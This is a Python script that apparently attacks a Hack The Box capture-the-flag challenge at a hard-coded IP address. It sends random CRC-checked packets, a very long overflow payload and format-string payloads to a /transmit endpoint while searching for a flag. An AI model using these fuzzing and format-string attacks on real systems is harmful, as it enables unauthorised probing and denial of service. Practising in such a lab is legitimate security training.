#!/usr/bin/env python3
import requests
import struct
import time
import re
import random

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 121: Random fuzzing agresivo
print("[*] INNOVACIÓN 121: Random fuzzing")
s = requests.Session()
s.get(base_url)

# Generar 500 paquetes random
for i in range(500):
    # Random 2-4 bytes
    length = random.randint(2, 4)
    random_bytes = bytes([random.randint(0, 255) for _ in range(length)])
    crc = crc16(random_bytes)
    packet = (random_bytes + struct.pack('<H', crc)).hex().upper()
    
    s.post(f'{base_url}/transmit', data={
        'freq': str(random.uniform(433, 435)),
        'mod': random.choice(['ASK', 'FSK', 'OOK']),
        'bits': str(random.randint(1, 8)),
        'msg': packet
    })

print(f"[*] Sent 500 random packets")
time.sleep(5)
r = s.get(base_url)

sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f"States after fuzzing: {sensor_states}")

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 122: Enviar payload muy largo para causar crash/debug
print("\n[*] INNOVACIÓN 122: Very long payload")
s = requests.Session()
s.get(base_url)

long_msg = 'A' * 100000
r = s.post(f'{base_url}/transmit', data={
    'freq': '433.92',
    'mod': 'ASK',
    'bits': '1',
    'msg': long_msg
})

if 'error' in r.text.lower() or 'exception' in r.text.lower() or len(r.text) > 10000:
    print(f"[+] Long payload response ({len(r.text)} bytes):")
    print(r.text[:1000])
    if 'HTB{' in r.text:
        print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 123: Format string attack
print("\n[*] INNOVACIÓN 123: Format string attack")
s = requests.Session()
s.get(base_url)

format_payloads = [
    '%x%x%x%x',
    '%s%s%s%s',
    '%p%p%p%p',
    '%n',
]

for payload in format_payloads:
    r = s.post(f'{base_url}/transmit', data={
        'freq': payload,
        'mod': payload,
        'bits': payload,
        'msg': payload
    })
    
    if len(r.text) > 10000 or 'HTB{' in r.text or '0x' in r.text:
        print(f"[+] Interesting response for {payload}:")
        print(r.text[:500])

print("\n[*] Innovaciones 121-123 completadas")
